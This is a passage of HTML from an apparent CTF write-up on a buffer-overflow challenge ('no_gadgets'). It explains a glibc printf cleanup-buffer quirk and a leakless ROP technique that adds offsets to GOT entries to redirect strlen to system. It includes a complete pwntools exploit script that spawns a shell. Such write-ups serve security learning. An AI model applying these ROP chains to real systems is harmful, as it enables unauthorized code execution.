style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">				</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">									</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">else</span><span class="token macro property expression" style="color:#36acaa">									</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression" style="color:#36acaa">_cleanup_start_doit </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> false</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* End critical region with cleanup.  */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">__libc_cleanup_region_end</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">DOIT</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">		</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_cleanup_start_doit</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">			</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression function" style="color:#d73a49">__libc_cleanup_pop_restore</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression operator" style="color:#393A34">&amp;</span><span class="token macro property expression" style="color:#36acaa">_buffer</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">	</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">DOIT</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">					</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression function" style="color:#d73a49">_cleanup_routine</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_buffer</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">__arg</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">		</span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property comment" style="color:#999988;font-style:italic">/* matches __libc_cleanup_region_start */</span><br></span></code></pre></div></div>
<p><code>printf</code> stores a <code>_pthread_cleanup_buffer</code> to keep track of how to cleanup the <code>FILE</code> when the function returns. It does this by storing a cleanup routine, and an argument, which would be the <code>FILE</code>. <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L2264" target="_blank" rel="noopener noreferrer">This</a> is where that happens (in <code>buffered_vfprintf</code> because the challenge unbuffered <code>stdout</code>).</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/* Lock stream.  */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">__libc_cleanup_region_start</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">_IO_funlockfile</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">_IO_flockfile</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>Huh look at that, the <code>__routine</code> is <code>_IO_funlockfile</code>, and if we look at <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/pthread.h#L159" target="_blank" rel="noopener noreferrer">_pthread_cleanup_buffer</a>.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/* Cleanup buffers */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_pthread_cleanup_buffer</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">__routine</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">             </span><span class="token comment" style="color:#999988;font-style:italic">/* Function to call.  */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">__arg</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">                            </span><span class="token comment" style="color:#999988;font-style:italic">/* Its argument.  */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> __canceltype</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">                       </span><span class="token comment" style="color:#999988;font-style:italic">/* Saved cancellation type. */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_pthread_cleanup_buffer</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">__prev</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* Chaining of cleanup functions.  */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>The <code>__routine</code> is stored at the start. And lastly, in <code>__libc_cleanup_region_end</code>, there&#x27;s this line.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">__libc_cleanup_pop_restore</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>So this cleanup buffer is passed to a <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/nptl/libc-cleanup.c#L38" target="_blank" rel="noopener noreferrer">function</a> (that I&#x27;m personally surprised isn&#x27;t inlined), and <code>rdi</code> doesn&#x27;t get changed at all, so it ends up pointing to the cleanup buffer, with <code>funlockfile</code> being the value it ends up pointing to!</p>
<p>But what about the cleanup routine? Interestingly <code>funlockfile</code> isn&#x27;t actually executed! The <code>0</code> in <code>_IO_cleanup_region_end (0);</code> represents the <code>DOIT</code> parameter, and if it&#x27;s 0, then the function isn&#x27;t called.</p>
<p>From what I can see, this behaviour has changed in <code>2.37</code>, at least this only happens when the application is multithreaded?</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="who-needs-leaks-anyway">Who needs leaks anyway?<a href="#who-needs-leaks-anyway" class="hash-link" aria-label="Direct link to Who needs leaks anyway?" title="Direct link to Who needs leaks anyway?">​</a></h3>
<p>This one was by <code>nobodyisnobody</code> (on discord), and it was probably my favourite, simply for how creative it was, and also how it required no leaks at all! It managed to squeeze blood out of the stone that was the limited collection of gadgets available in the binary itself!</p>
<p>It did this with the following gadgets:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010bf : add bl, al ; ... ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040115d : pop rbp ; ret</span><br></span></code></pre></div></div>
<p>By using the above gadgets, they were able to set <code>rbp</code> so that <code>rbp+0x3d</code> pointed to a <code>GOT</code> entry, then using <code>add dword ptr [rbp - 0x3d]</code>, they could <em>add</em> values to the <code>GOT</code> entries, instead of overwriting them. This way, you don&#x27;t need a libc leak, and you can change these functions to point to useful gadgets. However, to be able to do that, we need to be able to control <code>ebx</code>.</p>
<p>That&#x27;s where the top gadget comes in. You&#x27;ll notice how I&#x27;ve added the <code>...</code> which is because this is a fairly long gadget, but not a massively complex one. It&#x27;s as follows:</p>
<figure><img src="/assets/image (129).png" alt=""><figcaption><p><code>add bl, al</code></p></figcaption></figure>
<p>Adds <code>al</code> to <code>bl</code> (the lowest 8 bits of the <code>eax</code> and <code>ebx</code> registers respectively), then goes through a nop sled to end up in <code>deregister_tm_clones</code>. This sets <code>eax</code> to <code>0x404040</code> (thus setting <code>al</code> to <code>0x40</code>), then just returns.</p>
<p>It&#x27;s important to note that <code>rbx</code> and <code>rax</code> are set to <code>0</code> when <code>main</code> returns, so the first <code>add</code> does nothing to <code>ebx</code>, but sets <code>al</code> to <code>0x40</code>. Then if we call this gadget again, we can add <code>0x40</code> to <code>bl</code>. Then we could add this to <code>dword ptr [rbp - 0x3d]</code>!</p>
<p>So now we&#x27;re able to add <code>0x40</code>, <code>0x80</code> or <code>0xc0</code> to an arbitrary <code>dword</code>, but how do we use this? After all it&#x27;s a fairly weak primitive, since we have such limited control over <code>ebx</code>. Wouldn&#x27;t it be nice if we could get <code>pop rbx</code>?</p>
<p>Well it just so happens, when you add <code>0x80</code> to <code>setvbuf</code>, you get:</p>
<figure><img src="/assets/image (130).png" alt=""><figcaption><p><code>setvbuf+0x80</code></p></figcaption></figure>
<p>A <code>pop rbx</code> gadget! Fortunately the previous <code>r13</code> checks don&#x27;t pass, so we&#x27;re able to reach <code>pop rbx</code>. Now with complete control over <code>ebx</code>, we can completely change a <code>GOT</code> entry to <code>system</code>, in this case we do <code>strlen</code>, as our buffer is passed to it.</p>
<p>I cleaned up and slightly modified the script to get the following:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exe </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./no_gadgets&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./libc.so.6&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># needs debug symbols to know where __strlen_avx2 is</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rbp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4011d5</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic"># pop rbp ; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x401016</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fgets_gadget </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40121b</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov_al_40 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">deregister_tm_clones	</span><span class="token comment" style="color:#999988;font-style:italic"># mov eax, 0x404040 ; ... ; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add_bl_al </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4010bf</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">#  add bl, al ; ... ; mov eax, 0x404040 ; ... ; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add_gadget </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40115c</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;A&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">b&#x27;\x00&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># rbp+0x3d = setvbuf@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">got</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;setvbuf&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x3d</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># setvbuf@GOT = setvbuf + 0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">mov_al_40</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">add_bl_al</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">add_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># setvbuf+0x80 effectively does &quot;pop rbx,rbp,r12,r13,r14 ; ret&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;setvbuf&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ebx = system - setvbuf</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;system&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;__strlen_avx2&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># rbp+0x3d = strlen@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">got</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;strlen&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x3d</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># r12,r13,r14</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># strlen@GOT = system</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">add_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># rbp points to something writable</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rbp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404e08</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># stack alignment + trigger strlen() on input</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ret2dlresolve">ret2dlresolve<a href="#ret2dlresolve" class="hash-link" aria-label="Direct link to ret2dlresolve" title="Direct link to ret2dlresolve">​</a></h3>
<p>While I didn&#x27;t see any solutions using this, I always expected that it was possible, but I left it out as I thought it was more complicated than my intended.</p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/pwn/category/htb-business-2024"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">HTB Business 2024</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/pwn/category/corctf-2024"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">corCTF 2024</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#background" class="table-of-contents__link toc-highlight">Background</a></li><li><a href="#analysis" class="table-of-contents__link toc-highlight">Analysis</a><ul><li><a href="#analyzing-the-source-code" class="table-of-contents__link toc-highlight">Analyzing the source code</a></li><li><a href="#protections" class="table-of-contents__link toc-highlight">Protections</a></li></ul></li><li><a href="#intended-solution" class="table-of-contents__link toc-highlight">Intended Solution</a><ul><li><a href="#disclaimer" class="table-of-contents__link toc-highlight">Disclaimer</a></li><li><a href="#exploitation" class="table-of-contents__link toc-highlight">Exploitation</a></li><li><a href="#finding-gadgets" class="table-of-contents__link toc-highlight">Finding gadgets</a></li><li><a href="#getting-arbitrary-writes" class="table-of-contents__link toc-highlight">Getting arbitrary writes</a></li><li><a href="#getting-a-shell" class="table-of-contents__link toc-highlight">Getting a shell</a></li><li><a href="#solver" class="table-of-contents__link toc-highlight">Solver</a></li></ul></li><li><a href="#other-solutions" class="table-of-contents__link toc-highlight">Other solutions</a><ul><li><a href="#neatest-solution" class="table-of-contents__link toc-highlight">Neatest solution</a></li><li><a href="#fun-with-funlockfile" class="table-of-contents__link toc-highlight">Fun with (fun)lockfile</a></li><li><a href="#who-needs-leaks-anyway" class="table-of-contents__link toc-highlight">Who needs leaks anyway?</a></li><li><a href="#ret2dlresolve" class="table-of-contents__link toc-highlight">ret2dlresolve</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/pwn/">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://x.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">X<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div 